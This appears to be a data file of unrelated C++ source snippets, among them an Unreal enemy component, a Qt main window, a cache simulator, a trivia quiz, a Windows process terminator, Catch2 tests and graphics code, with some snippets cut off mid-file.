    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"Enemy/EnemyStateComponent.h\"\n\n// Sets default values for this component's properties\nUEnemyStateComponent::UEnemyStateComponent()\n{\n\t// Set this component to be initialized when the game starts, and to be ticked every frame.  You can turn these features\n\t// off to improve performance if you don't need them.\n\tPrimaryComponentTick.bCanEverTick = true;\n\n\tbDied = false;\n\tbCanMove = true;\n\tbCanAttack = true;\n}\n\n\n// Called when the game starts\nvoid UEnemyStateComponent::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tCurrentHp = MaxHp;\t\n}\n\n\n// Called every frame\nvoid UEnemyStateComponent::TickComponent(float DeltaTime, ELevelTick TickType, FActorComponentTickFunction* ThisTickFunction)\n{\n\tSuper::TickComponent(DeltaTime, TickType, ThisTickFunction);\n\n\t// ...\n}\n\nvoid UEnemyStateComponent::ReduceHp(const float Damage)\n{\n\tif (bDied) { return; }\n\n\tCurrentHp -= Damage;\n\n\tif (CurrentHp <= 0)\n\t{\n\t\tCurrentHp = 0;\n\t\tbDied = true;\n\t}\n\n\tUE_LOG(LogTemp, Display, TEXT(\"CurrnetHp : %.1f\"), CurrentHp);\n}\n\n",
    "#include \"output_to_client.hpp\"\n\n#include <iostream>\n#include <asio.hpp>\n#include <vector>\n#include <cstring>\n#include \"object_handler.hpp\"\n\nconst uint16_t client_output_time_interval = 1667;\n\nstruct preamble_t\n{\n    uint32_t preamble;\n    uint32_t object_count;\n};\n\npreamble_t client_preamble = {0xFE00, 0};\n\n/**\n * @brief Split input into vector with bytes for the preamble type elements.\n * @param input Preamble object.\n * @return Vector with bytes\n */\nstatic std::vector<uint8_t> serialize_preamble(preamble_t &input)\n{\n    std::vector<uint8_t> buffer(sizeof(preamble_t));\n    std::memcpy(buffer.data(), &input, sizeof(preamble_t));\n    return buffer;\n}\n\n/**\n * @brief Split input into vector with bytes for the object type elements. Exclude category.\n * @param object Object\n * @return Vector with bytes.\n */\nstatic std::vector<uint8_t> serialize_object(object_t &object)\n{\n    std::vector<uint8_t> buffer;\n\n    buffer.reserve(sizeof(object.id) + sizeof(object.x_cord) + sizeof(object.y_cord) + sizeof(object.type) + sizeof(object.color));\n\n    auto append_to_buffer = [&buffer](const void *data, size_t size)\n    {\n        const uint8_t *byte_data = reinterpret_cast<const uint8_t *>(data);\n        buffer.insert(buffer.end(), byte_data, byte_data + size);\n    };\n\n    append_to_buffer(&object.id, sizeof(object.id));\n    append_to_buffer(&object.x_cord, sizeof(object.x_cord));\n    append_to_buffer(&object.y_cord, sizeof(object.y_cord));\n    append_to_buffer(&object.type, sizeof(object.type));\n    append_to_buffer(object.color, sizeof(object.color));\n\n    return buffer;\n}\n\n/**\n * @brief Output a preamble followed by each object in binary form to the client.\n * @param client_data Client connection.\n * @param timer Timer\n * @param object_list Vector with objects to send to client.\n */\nvoid fixed_time_output_to_client(asio::ip::tcp::iostream &client_data, asio::steady_timer &timer, std::vector<object_t> &object_list)\n{\n    // Write the preamble data in binary form to the client stream\n    client_preamble.object_count = object_list.size();\n    std::vector<uint8_t> preamble_data = serialize_preamble(client_preamble);\n    client_data.write(reinterpret_cast<const char *>(preamble_data.data()), preamble_data.size());\n\n    // Write each object in binary form  to the client stream\n    std::vector<uint8_t> binary_data;\n    for (uint16_t i = 0; i < object_list.size(); i++)\n    {\n        binary_data = serialize_object(object_list[i]);\n        client_data.write(reinterpret_cast<const char *>(binary_data.data()), binary_data.size());\n    }\n\n    // Set up the timer to expire after x ms.\n    timer.expires_after(std::chrono::milliseconds(client_output_time_interval));\n\n    // Asyncronous wait until timer expires.\n    timer.async_wait([&client_data, &timer, &object_list](const asio::error_code &error)\n                     {\n        if (!error) {\n            fixed_time_output_to_client(client_data, timer, object_list);\n        }\n        else\n        {\n            std::clog << \"Error in output to client: \" << error.message() << std::endl;\n        } });\n}",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n\n#include \"settingswindow.h\"\n#include \"markwindow.h\"\n#include \"controlwindow.h\"\n#include \"modelwindow.h\"\n#include \"lotwindow.h\"\n#include \"designwindow.h\"\n#include \"passwindow.h\"\n#include \"logindialog.h\"\n\n#include \"protector.h\"\n#include \"message.h\"\n\n#include \"systemerror.h\"\n\n#include <iostream>\n\nMainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWindow){\n    ui->setupUi(this);\n\n    ui->pageSetting->layout()->addWidget(new SettingsWindow(this));\n    ui->pagePass->layout()->addWidget(new PassWindow(this));\n    ui->pageMark->layout()->addWidget(new MarkWindow(this));\n    ui->pageControl->layout()->addWidget(new ControlWindow(this));\n    ui->pageModel->layout()->addWidget(new ModelWindow(this));\n    ui->pageScheddule->layout()->addWidget(new LotWindow(this));\n    ui->pageDesign->layout()->addWidget(new DesignWindow(this));\n\n\n    actions.push_back(ui->actionSettings);\n    actions.push_back(ui->actionPass);\n    actions.push_back(ui->actionMark);\n    actions.push_back(ui->actionControl);\n    actions.push_back(ui->actionLot);\n    actions.push_back(ui->actionModel);\n    actions.push_back(ui->actionDesign);\n    actions.push_back(ui->actionIVProgram);\n\n    pages.push_back(ui->pageSetting);\n    pages.push_back(ui->pagePass);\n    pages.push_back(ui->pageMark);\n    pages.push_back(ui->pageControl);\n    pages.push_back(ui->pageScheddule);\n    pages.push_back(ui->pageModel);\n    pages.push_back(ui->pageDesign);\n    pages.push_back(ui->pageIV);\n\n    for(auto &action : actions){\n        connect(action, &QAction::toggled, this, &MainWindow::menuTabToggled);\n    }\n    ui->actionMark->setChecked(true);\n\n    connect(SystemError::instance(), &SystemError::reported, this, &MainWindow::errorReported);\n    connect(Protector::instance(), &Protector::loginChanged, this, &MainWindow::loginChanged);\n\n    setWindowState(Qt::WindowMaximized);\n}\n\nMainWindow::~MainWindow(){\n    delete ui;\n}\n\nvoid MainWindow::setNavEnable(bool en){\n    ui->toolBar->setEnabled(en);\n}\n\nvoid MainWindow::showEvent(QShowEvent*){\n\n}\n\nvoid MainWindow::closeEvent(QCloseEvent*){\n\n}\n\nvoid MainWindow::errorReported(Exception ex){\n    Message::error(ex.message, ex.where);\n}\n\nvoid MainWindow::loginChanged(){\n    updateUI();\n}\n\nvoid MainWindow::updateUI(){\n    User *user = Protector::instance()->currentUser();\n    if(user == nullptr){\n        ui->actionLogin->setText(\"\u0110\u0103ng nh\u1eadp\");\n        ui->actionSettings->setEnabled(false);\n        ui->actionControl->setEnabled(false);\n        ui->actionLot->setEnabled(false);\n        ui->actionModel->setEnabled(false);\n        ui->actionDesign->setEnabled(false);\n        ui->actionIVProgram->setEnabled(false);\n    }\n    else{\n        ui->actionLogin->setText(\"\u0110\u0103ng xu\u1ea5t\");\n        bool isAdmin = user->isAdmin;\n        bool isSuper = user->isSuper;\n        bool isWorking = false;\n        ui->actionSettings->setEnabled(isAdmin);\n        ui->actionControl->setEnabled(isAdmin);\n        ui->actionLot->setEnabled(isAdmin || isSuper);\n        ui->actionModel->setEnabled(isAdmin);\n        ui->actionDesign->setEnabled(isAdmin);\n        ui->actionIVProgram->setEnabled(isAdmin);\n    }\n}\n\nvoid MainWindow::menuTabToggled(bool ){\n    for(int i =0; i < actions.size(); i++){\n        QAction *_sender = (QAction*)sender();\n        bool match = _sender == actions[i];\n        disconnect(actions[i], &QAction::toggled, this, &MainWindow::menuTabToggled);\n        if(match){\n            ui->stackedWidget->setCurrentWidget(pages[i]);\n            actions[i]->setChecked(true);\n        }\n        else{\n            actions[i]->setChecked(false);\n        }\n        connect(actions[i], &QAction::toggled, this, &MainWindow::menuTabToggled);\n    }\n}\n\n\nvoid MainWindow::on_actionLogin_triggered(){\n    if(Protector::instance()->currentUser()!=nullptr){\n        int res = Message::warning(\"B\u1ea1n c\u00f3 ch\u1eafc ch\u1eafn mu\u1ed1n \u0111\u0103ng xu\u1ea5t kh\u00f4ng ?\",\"Khoan \u0111\u00e3\");\n        if(res == QMessageBox::StandardButton::Yes){\n            Protector::instance()->logout();\n            ui->actionMark->setChecked(true);\n        }\n    }\n    else{\n        LoginDialog dlg(this);\n        if(dlg.exec()){\n\n        }\n    }\n}\n\n",
    "/*=============================================================================\n    Copyright (c) 2006 Joel de Guzman\n    http://spirit.sourceforge.net/\n\n    Use, modification and distribution is subject to the Boost Software\n    License, Version 1.0. (See accompanying file LICENSE_1_0.txt or copy at\n    http://www.boost.org/LICENSE_1_0.txt)\n=============================================================================*/\n#include <string>\n\n//[ bar\n//` This is the [*/bar/] function\nstd::string bar()\n{\n    // return 'em, bar man!\n    return \"bar\";\n}\n//]\n\n//[ foo\n/*` This is the [*['foo]] function. */\nstd::string foo()\n{\n    // return 'em, foo man!\n    return \"foo\";\n}\n//]\n\n//[ foo_bar\nstd::string foo_bar() /*< The /Mythical/ FooBar.\n                      See [@http://en.wikipedia.org/wiki/Foobar Foobar for details] >*/\n{\n    return \"foo-bar\"; /*< return 'em, foo-bar man! >*/\n}\n//]\n\n//[ class_\nclass x\n{\npublic:\n\n    /*<< Constructor >>*/\n    x() : n(0)\n    {\n    }\n\n    /*<< Destructor >>*/\n    ~x()\n    {\n    }\n\n    /*<< Get the `n` member variable >>*/\n    int get() const\n    {\n        return n; /*<- this will be ignored by quickbook ->*/\n    }\n\n    /*<< Set the `n` member variable >>*/\n    void set(int n_)\n    {\n        n = n_;\n    }\n//<- this will be ignored by quickbook\nprivate:\n\n    int n;\n//->\n};\n//]\n",
    "\n#include <iostream>\n#include <vector>\n#include <fstream>\n\nusing namespace std;\n\nconst int MIN_NR = 10, MAX_NR = 99, MIN_LS = 5, MAX_LS = 20;\n\nclass DoublyLinkedList {\n    private:\n        struct Node \n        {\n            //int data;\n            string name;\n            Node* prev;\n            Node* next;\n            Node(string nm, Node* p = nullptr, Node* n = nullptr) {\n            //data  = val; \n            name = nm;\n            prev = p;\n            next = n;\n        }\n    };\n    Node* head;\n    Node* tail;\n   \n    public:\n        DoublyLinkedList() { head = nullptr; tail = nullptr; }\n\n\n\n        void insert_after(string n, int position) {\n        if (position < 0) {\n        cout << \"Position must be >= 0.\" << endl;\n        return;\n        }\n        Node* newNode = new Node(n);\n        if (!head) {\n        head = tail = newNode;\n        return;\n        }\n        Node* temp = head;\n        for (int i = 0; i < position && temp; ++i)\n        temp = temp->next;\n        if (!temp) {\n        cout << \"Position exceeds list size. Node not inserted.\\n\";\n        delete newNode;\n        return;\n        }\n        newNode->next = temp->next;\n        newNode->prev = temp;\n        if (temp->next)\n        temp->next->prev = newNode;\n        else\n        tail = newNode;\n        temp->next = newNode;\n        }\n\n        void delete_val(string n) {\n        if (!head) return;\n        Node* temp = head;\n        while (temp && temp->name != n)\n        temp = temp->next;\n        if (!temp) return;\n        if (temp->prev)\n        temp->prev->next = temp->next;\n        else\n        head = temp->next;\n        if (temp->next)\n        temp->next->prev = temp->prev;\n        else\n        tail = temp->prev;\n        delete temp;\n        }\n\n        void delete_pos(int pos) {\n        if (!head) {\n        cout << \"List is empty.\" << endl;\n        return;\n        }\n        if (pos == 1) {\n        pop_front();\n        return;\n        }\n        Node* temp = head;\n        for (int i = 1; i < pos; i++){\n        if (!temp) {\n        cout << \"Position doesn't exist.\" << endl;\n        return;\n        }\n        else\n        temp = temp->next;\n        }\n        if (!temp) {\n        cout << \"Position doesn't exist.\" << endl;\n        return;\n        }\n        if (!temp->next) {\n        pop_back();\n        return;\n        }\n        Node* tempPrev = temp->prev;\n        tempPrev->next = temp->next;\n        temp->next->prev = tempPrev;\n        delete temp;\n        }\n\n        void push_back( string n) {\n        Node* newNode = new Node(n);\n        if (!tail)\n        head = tail = newNode;\n        else {\n        tail->next = newNode;\n        newNode->prev = tail;\n        tail = newNode;\n        }\n        }\n\n        void push_front(string n) {\n        Node* newNode = new Node(n);\n        if (!head)\n        head = tail = newNode;\n        else {\n        newNode->next = head;\n        head->prev = newNode;\n        head = newNode;\n        }\n        }\n\n        void pop_front() {\n        if (!head) {\n        cout << \"List is empty.\" << endl;\n        return;\n        }\n        Node * temp = head;\n        if (head->next) {\n        head = head->next;\n        head->prev = nullptr;\n        }\n        else\n        head = tail = nullptr;\n        delete temp;\n        }\n\n        void pop_back() {\n        if (!tail) {\n        cout << \"List is empty.\" << endl;\n        return;\n        }\n        Node * temp = tail;\n        if (tail->prev) {\n        tail = tail->prev;\n        tail->next = nullptr;\n        }\n        else\n        head = tail = nullptr;\n        delete temp;\n        }\n\n        ~DoublyLinkedList() {\n        while (head) {\n        Node* temp = head;\n        head = head->next;\n        delete temp;\n        }\n        }\n\n        void print() {\n        Node* current = head;\n        if (!current) {\n        cout << \"List is empty.\" << endl;\n        return;\n        }\n        while (current) {\n        cout << current->name <<endl;\n       current = current->next;\n        }\n        cout << endl;\n        }\n\n        void print_reverse() {\n        Node* current = tail;\n        if (!current) {\n        cout << \"List is empty.\" << endl;\n        return;\n        }\n        while (current) {\n        cout << current->name << \" \";\n        current = current->prev;\n        }\n        cout << endl;\n    }\n};\nint main() {\n    \n     vector<string> names;\n\n     ifstream input;\n     string n;\n     input.open(\"name.txt\");\n     \n       \n            while(input>>n)\n            {\n                names.push_back(n); \n            }\n           /* for(int i = 0; i < names.size(); i++)\n            {\n                cout<<names[i]<<\" \";\n            }*/\n        \n    input.close();\n\n    vector<string> n2;\n    DoublyLinkedList list;\n    srand(time(0));\n     int random = rand() % names.size(); \n\n    for (int i = 0; i < 5; i++)\n    {\n        list.push_back(names[random]);\n        n2.push_back(names[random]);\n        random = rand() % names.size(); \n    }\n    cout<<\"Store opens: \"<<endl;\n    list.print();\n    cou",
    "#include<iostream>\r\nusing namespace std;\r\nint main(){\r\n    string question[]={\"1. When was House of Balloons Released?\",\r\n                       \"2. What is the most streamed song of all time?\",\r\n                       \"3. How many songs of the weeknd have over 1 billion streams on spotify?\",\r\n                       \"4. How many mixtapes does the weeknd have?\"};\r\n\r\n    string options[][4]={{\"A. 2013\", \"B. 2011\", \"C. 2010\", \"D. 2009\"},\r\n                         {\"A. Starboy\", \"B. Shape of You\", \"C. Despacito\", \"D. Blinding Lights\"},\r\n                         {\"A. 18\", \"B. 20\", \"C. 5\", \"D. 12\"},\r\n                         {\"A. 1\",\"B. 9\",\"C. 3\",\"D. 7\"}};\r\n    char anskey[]={'B', 'D', 'B', 'C'};\r\n    int size = sizeof(question)/sizeof(string);\r\n    char guess;\r\n    double score=0;\r\n    for(int i=0;i<size;i++){\r\n        cout<<question[i]<<'\\n';\r\n        for(int j=0;j<sizeof(options[i])/sizeof(options[i][0]); j++){cout<<options[i][j]<<'\\n';}\r\n        cin>>guess;\r\n        guess=toupper(guess);\r\n        if(guess==anskey[i]){cout<<\"Correct!!\\n\";\r\n        score++;}\r\n        else{cout<<\"Wrong!!!!\\n\";\r\n        cout<<\"Correct Answer:\"<<anskey[i]<<'\\n';}\r\n        \r\n\r\n    }\r\n\r\n\r\n    cout<<\"Results:\\n\";\r\n    cout<<\"Correct Answers: \"<<score<<'\\n';\r\n    cout<<\"Score: \"<<(score)/(size)*100<<\"%\";\r\n\r\n    \r\n    return 0;\r\n}",
    "#include \"terminator.hpp\"\n\nint ClassicTerminator::TerminateProcessByPID(DWORD ProcessID, const wchar_t* processName) const\n{\n    wchar_t  processPath[MAX_PATH] = { 0 };\n\n    std::unique_ptr<HANDLE, HandleDeleter> hProcess(\n        new HANDLE(OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcessID)));\n    if (*hProcess) {\n\n        // Check again the name of the exe trough the handle to prevent a race condition (TOCTOU)\n        // The senario: A process with with the target name created with <PID>, we scanned the snapshot and added it to pids vector\n        // In the meantime this process terminated and a new process with the same pid BUT with a different exe file has been created.\n        // By double checking the name of the executable file through the hanle itself we can prevent this scenario.\n        if (GetModuleFileNameExW(*hProcess, NULL, processPath, MAX_PATH) > 0) {\n            if (!isFileNameMatchingPath(processPath, processName))\n            {\n                throw std::runtime_error(\"Error: possible race condition detected. file name isn't matched the excepted\");\n            }\n        }\n        else\n        {\n            throw std::runtime_error(\"Error: Failed to get process name.\");\n        }\n\n        // Terminate the process\n        if (TerminateProcess(*hProcess, 0)) {\n            return TERMINATION_SUCCEDED;\n        }\n        else {\n            throw std::runtime_error(\"Failed to terminate the process.\");\n            \n        }\n    }\n    else {\n        throw std::runtime_error(\"Failed to open process.\");\n    }\n}",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <fstream>\n#include <string>\n#include <cstdint> // for using uint32_t \n#include <stdexcept>\n#include <list>\n#include <mutex>\n#include <thread>\n#include <sstream>\n\n//#define protocol 0 1 (MESI or DRAGON)\n\n// #define CACHE_SIZE 4096 //1024\n// #define CACHE_ASSOC 2\n// #define CACHE_BLOCK_SIZE 32\n// #define FILE_NAME \"blackscholes_\"\n#define DRAMsize 0xFFFFFFFF // 4GB DRAM\n\nint CACHE_SIZE = 4096;\nint CACHE_ASSOC = 2;\nint CACHE_BLOCK_SIZE = 32;\nstd::string FILE_NAME = \"blackscholes_\";\nstd::string PROTOCOL = \"NONE\";\n\nunsigned int busTraffic = 0;\n\n// Function to read one line from the file and return label and data (as integer)\nstd::pair<int, unsigned int> readLabelAndData(const std::string& line) {\n    std::istringstream iss(line);\n    int label;\n    unsigned int data;\n\n    // Parse label and hex data from the line\n    if (iss >> label >> std::hex >> data) {\n        return {label, data};  // Return label and data as a pair\n    }\n\n    // If parsing fails, return default error values\n    return {-1, 0};\n}\n\n\n\n\nstd::string generateFileName(const int index) {\n    return \"data/\" + std::string(FILE_NAME) + std::to_string(index) + \".data\";\n}\n\nclass DRAM {    \nprivate:\n    uint8_t* memory;   //memory 1bytes \n    size_t size;        //size of dram (# of words)\n    std::mutex mem_mutex;\n\npublic:\n    explicit DRAM(const size_t sizeInBytes) : size(sizeInBytes){\n        // memory = new (std::nothrow) uint8_t[size];\n        // // if(!memory){\n        // //     throw std::bad_alloc(); //\n        // // }\n        // std::fill(memory, memory+size ,0);\n    }\n\n    // ~DRAM() {\n    //     delete[] memory;\n    // }\n    \n    // void write(size_t address, uint8_t value){ // write to memory\n    //     if (address >= size){\n    //         throw std::out_of_range(\"out of range of address\");\n    //     }\n    // memory[address] = value;\n    // }\n\n    // uint8_t read(size_t address) const{    //read from memory\n    //     if(address>= size){\n    //         throw std::out_of_range(\"out of range of address\");\n    //     }\n    //     return memory[address];\n    // }\n\n    // size_t getSize() const{ // return size\n    //     return size;\n    // }\n\n};\n\nclass CacheLine {\npublic:\n    bool valid;\n    int tag;\n    //int data;   do not need for simulation\n\n    CacheLine() : valid(false), tag(-1) {}\n};\n\nclass Cache {\nprivate:\n    int cacheSize;      // Total cache size in bytes\n    int blockSize;      // Size of each cache block in bytes\n    int associativity;  // Associativity (n-way set-associative)\n    int numSets;        // Total number of sets\n    std::vector<std::list<CacheLine>> sets;  // List of sets, each containing cache lines\n\n\npublic:\n    // Constructor\n    Cache(int cacheSize, int blockSize, int associativity)\n        : cacheSize(cacheSize), blockSize(blockSize), associativity(associativity) {\n        \n        // Calculate the number of sets\n        numSets = (cacheSize / blockSize) / associativity;\n\n        // Initialize each set with an empty list of cache lines\n        sets.resize(numSets);\n    }\n    bool set_hit_or_not =false ;\n    bool hit = false ;\n    // Access method (returns true if hit, false if miss)\n    bool access(int address) {\n        int blockIndex = (address / blockSize) % numSets;  // Calculate set index\n        int tag = address / (blockSize * numSets);          // Calculate tag\n\n        // Get the list representing the set\n        auto& set = sets[blockIndex];\n\n        // Check for a cache hit by searching the set for the tag\n        for (auto it = set.begin(); it != set.end(); ++it) {\n            if (it->valid && it->tag == tag) {\n                // On a cache hit, move the cache line to the front (LRU policy)\n                set.splice(set.begin(), set, it);\n                return true;  // Cache hit\n            }\n        }\n\n        //TODO: on eviction, do a writeback(drive bus and send to memory). Only needs to block until done driving bus\n        // Unsure if the CPU needs to block or not on a writeback, or if it just needs to take up the bus\n        // Handle a cache miss\n        if (set.size() >= associativity) {\n            // If the set is full, remove the least recently used (LRU) cache line\n            set.pop_back();\n            const int WORD_SIZE = 4;\n            const int BANDWIDTH_PENALTY = 2 * (CACHE_BLOCK_SIZE / WORD_SIZE);\n            busTraffic = busTraffic + (BANDWIDTH_PENALTY/2);\n        }\n\n        // Add a new cache line with the correct tag\n        CacheLine newLine;\n        newLine.valid = true;\n        newLine.tag = tag;\n        set.push_front(newLine);\n\n        return false;  // Cache miss\n    }\n};\n\n//TODO: Implement bus state that it broadcasts to the entire system. Also implement a queue for who drives the bus.\nclass Bus {\nprivate:\n    bool isOccupied = false;\n\npublic:\n    void putOnBus(int address);\n};\n\n\n\n//TODO: add a drive bus method that will switch the state of the CPU from idle to driving bus\nclass CPU {\nprivate:\n    int id;",
    "#include \"scene_state.h\"\n\n#include \"rapidjson/document.h\"\n#include \"logging/easylogging++.h\"\n#include \"assets/asset_manager.h\"\n#include \"assets/text_asset.h\"\n\nvoid SceneState::Build()\n{\n    // Create the scene\n    rapidjson::Document map;\n    // For now we just hardcode loading the map in assets/scenes/default.json\n    // In the future we will load this dynamically\n    std::string filename = \"scenes/default.json\";\n    auto text = AssetManager::GetInstance().Get<TextAsset>(filename);\n    if (text == nullptr)\n    {\n        LOG(ERROR) << \"Failed to load map: \" << filename;\n        return;\n    }\n    auto json = text->GetText();\n    if (text)\n    {\n        map.Parse(text->GetText().c_str());\n        if (map.HasParseError())\n        {\n            LOG(ERROR) << \"Failed to parse map: \" << filename << \": \" << map.GetParseError();\n            // Log error\n            return;\n        }\n        if (map.IsObject())\n        {\n            if (map.HasMember(\"width\") && map[\"width\"].IsInt())\n            {\n                width = map[\"width\"].GetInt();\n            }\n            if (map.HasMember(\"height\") && map[\"height\"].IsInt())\n            {\n                height = map[\"height\"].GetInt();\n            }\n            if (map.HasMember(\"tiles\") && map[\"tiles\"].IsArray())\n            {\n                auto q = 0, r = 0;\n                for (auto &tile : map[\"tiles\"].GetArray())\n                {\n                    if (tile.IsObject())\n                    {\n                        if (q % width == 0)\n                        {\n                            q = 0;\n                            r++;\n                        }\n                        if (tile.HasMember(\"sprite\") && tile[\"sprite\"].IsString())\n                        {\n                            CreateTile(q, r, tile[\"sprite\"].GetString());\n                        }\n                        q++;\n                    }\n                }\n            }\n        }\n    }\n}\n\nvoid SceneState::Destroy()\n{\n    // Destroy the scene\n    for (auto &tile : tiles)\n    {\n        scene->RemoveChild(tile.second);\n    }\n    tiles.clear();\n}\n\nvoid SceneState::CreateTile(int q, int r, const std::string &filename)\n{\n    std::string key = hexKey(q, r);\n    if (tiles.find(key) == tiles.end())\n    {\n        std::shared_ptr<Tile> tile = std::make_shared<Tile>();\n        tile->SetPosition(q, r);\n        tile->SetTexture(\"textures/\" + filename);\n        scene->AddChild(tile);\n        tiles.emplace(key, tile);\n        LOG(DEBUG) << \"Created tile at \" << q << \",\" << r << \" with texture \" << filename;\n    }\n}",
    "\n//              Copyright Catch2 Authors\n// Distributed under the Boost Software License, Version 1.0.\n//   (See accompanying file LICENSE.txt or copy at\n//        https://www.boost.org/LICENSE_1_0.txt)\n\n// SPDX-License-Identifier: BSL-1.0\n\n#define CATCH_CONFIG_ENABLE_OPTIONAL_STRINGMAKER\n#include <catch2/catch_test_macros.hpp>\n\n#if defined(CATCH_CONFIG_CPP17_OPTIONAL)\n\nTEST_CASE( \"std::optional<int> -> toString\", \"[toString][optional][approvals]\" ) {\n    using type = std::optional<int>;\n    REQUIRE( \"{ }\" == ::Catch::Detail::stringify( type{} ) );\n    REQUIRE( \"0\" == ::Catch::Detail::stringify( type{ 0 } ) );\n}\n\nTEST_CASE( \"std::optional<std::string> -> toString\", \"[toString][optional][approvals]\" ) {\n    using type = std::optional<std::string>;\n    REQUIRE( \"{ }\" == ::Catch::Detail::stringify( type{} ) );\n    REQUIRE( \"\\\"abc\\\"\" == ::Catch::Detail::stringify( type{ \"abc\" } ) );\n}\n\nTEST_CASE( \"std::vector<std::optional<int> > -> toString\", \"[toString][optional][approvals]\" ) {\n    using type = std::vector<std::optional<int> >;\n    REQUIRE( \"{ 0, { }, 2 }\" == ::Catch::Detail::stringify( type{ 0, {}, 2 } ) );\n}\n\nTEST_CASE( \"std::nullopt -> toString\", \"[toString][optional][approvals]\" ) {\n    REQUIRE( \"{ }\" == ::Catch::Detail::stringify( std::nullopt ) );\n}\n\n#endif // CATCH_INTERNAL_CONFIG_CPP17_OPTIONAL\n",
    "#include \"Errors.h\"\n#include \"Log.h\"\n#include \"Types.h\"\n#include <cstdlib>\n#include <intrin.h>\n\n[[noreturn]] static void IErrors_Halt(void)\n{\n\t__ud2();\n}\n\n/**\n *\tReport a failed assertion and exit the program\n *\t\n *\t@param file the file where the error occured\n *\t@param line the line number where the error occured\n *\t@param desc an error message\n */\n[[noreturn]] void _AssertionFailed(const char * file, unsigned long line, const char * desc)\n{\n\t_FATALERROR(\"Assertion failed in %s (%d): %s\", file, line, desc);\n\n\tIErrors_Halt();\n}\n\n/**\n *\tReport a failed assertion and exit the program\n *\t\n *\t@param file the file where the error occured\n *\t@param line the line number where the error occured\n *\t@param desc an error message\n *\t@param code the error code\n */\n[[noreturn]] void _AssertionFailed_ErrCode(const char * file, unsigned long line, const char * desc, unsigned long long code)\n{\n\tif(code & 0xFFFFFFFF00000000)\n\t\t_FATALERROR(\"Assertion failed in %s (%d): %s (code = %16I64X (%I64d))\", file, line, desc, code, code);\n\telse\n\t{\n\t\tu32\tcode32 = code;\n\t\t_FATALERROR(\"Assertion failed in %s (%d): %s (code = %08X (%d))\", file, line, desc, code32, code32);\n\t}\n\t\n\tIErrors_Halt();\n}\n\n/**\n *\tReport a failed assertion and exit the program\n *\t\n *\t@param file the file where the error occured\n *\t@param line the line number where the error occured\n *\t@param desc an error message\n *\t@param code the error code\n */\n[[noreturn]]void _AssertionFailed_ErrCode(const char * file, unsigned long line, const char * desc, const char * code)\n{\n\t_FATALERROR(\"Assertion failed in %s (%d): %s (code = %s)\", file, line, desc, code);\n\n\tIErrors_Halt();\n}\n",
    "#include \"../game.hpp\"\n\n[[gnu::section(\".iwram.kernelScale2Col32\")]]\n[[gnu::target(\"arm\")]]\nvoid kernelScale2Col32(uint8_t const* column1, uint8_t const* column2, uint16_t* fb, int h) {\n    static_assert(TEX_HEIGHT == 32);\n\n    int v_offset_subpix = 0;        // 2**16 ~ 1 px\n\n    // TODO: optimize division\n    int dv_dy = TEX_HEIGHT * 0x10000 / h;  // v-coordinate increment per scanline (2**16 ~ 1px)\n\n    if (h < TEX_HEIGHT) {\n        // \"short\" case (source image minified)\n\n        for (int yy = 0; yy < h; yy++) {\n            // texture v-coordinate (top to bottom)\n            auto v = (v_offset_subpix + yy * dv_dy) / 0x10000;\n\n            uint8_t col = column1[v];\n            uint8_t col2 = column2[v];\n\n            // TODO: are there gains to be made by using 16-/32-bit loads of span data?\n            *fb = col | (col2 << 8);\n            fb += M4_WIDTH / 2;\n        }\n    }\n    else {\n        // \"tall\" case (source image magnified)\n\n        // texture v-coordinate (top to bottom) in integer pixels\n        auto v = v_offset_subpix / 0x10000;\n\n        // texture v-coordinate subpixel, 2**16 ~ 1 px\n        int v_frac_part = v_offset_subpix % 0x10000;\n\n        // TODO: reduce y_bot if spans end earlier?\n        for (int yy = 0; yy < h; ) {\n            uint8_t col = column1[v];\n            uint8_t col2 = column2[v];\n\n            // this is the critical path and would likely benefit from partial unrolling\n            for (; v_frac_part < 0x10000; v_frac_part += dv_dy) {\n                *fb = col | (col2 << 8);\n                fb += M4_WIDTH / 2;\n                yy++;\n\n                if (yy >= h) {\n                    break;\n                }\n            }\n\n            v_frac_part -= 0x10000;\n            v++;\n        }\n    }\n}",
    "\n#include \"breakout/camera.hpp\"\n\n#include <glm/gtc/matrix_transform.hpp>\n\nnamespace bk\n{\n\n    Camera::Camera(glm::vec3 position, glm::vec3 up, float yaw, float pitch)\n    : m_Position(position), m_WorldUp(up), m_Yaw(yaw), m_Pitch(pitch)\n    {\n        UpdateCameraVectors();\n    }\n\n    Camera::Camera(float posX, float posY, float posZ, float upX, float upY, float upZ, float yaw, float pitch)\n    : m_Position(glm::vec3(posX, posY, posZ)), m_WorldUp(glm::vec3(upX, upY, upZ)), m_Yaw(yaw), m_Pitch(pitch)\n    {\n        UpdateCameraVectors();\n    }\n\n    glm::mat4 Camera::GetViewMatrix() const\n    {\n        return glm::lookAt(m_Position, m_Position + m_Front, m_Up);\n    }\n\n    void Camera::ProcessKeyboard(CameraMovement direction, float deltaTime)\n    {\n        float velocity = m_MovementSpeed * deltaTime;\n        if (direction == CameraMovement::eForward)\n            m_Position += m_Front * velocity;\n        if (direction == CameraMovement::eBackward)\n            m_Position -= m_Front * velocity;\n        if (direction == CameraMovement::eLeft)\n            m_Position -= m_Right * velocity;\n        if (direction == CameraMovement::eRight)\n            m_Position += m_Right * velocity;\n        if (direction == CameraMovement::eUp)\n            m_Position += m_Up * velocity;\n        if (direction == CameraMovement::eDown)\n            m_Position -= m_Up * velocity;\n\n    }\n\n    void Camera::ProcessMouseMovement(float xOffset, float yOffset, bool constrainPitch)\n    {\n        xOffset *= m_MouseSensitivity;\n        yOffset *= m_MouseSensitivity;\n\n        m_Yaw += xOffset;\n        m_Pitch += yOffset;\n\n        // Make sure that when pitch is out of bounds, screen doesn't get flipped\n        if (constrainPitch)\n        {\n            if (m_Pitch > 89.0f)\n                m_Pitch = 89.0f;\n            if (m_Pitch < -89.0f)\n                m_Pitch = -89.0f;\n        }\n\n        // Update Front, Right and Up Vectors using the updated Euler angles\n        UpdateCameraVectors();\n    }\n\n    void Camera::ProcessMouseScroll(float yoffset)\n    {\n        if (m_Zoom >= 1.0f && m_Zoom <= 45.0f)\n            m_Zoom -= yoffset;\n        if (m_Zoom <= 1.0f)\n            m_Zoom = 1.0f;\n        if (m_Zoom >= 45.0f)\n            m_Zoom = 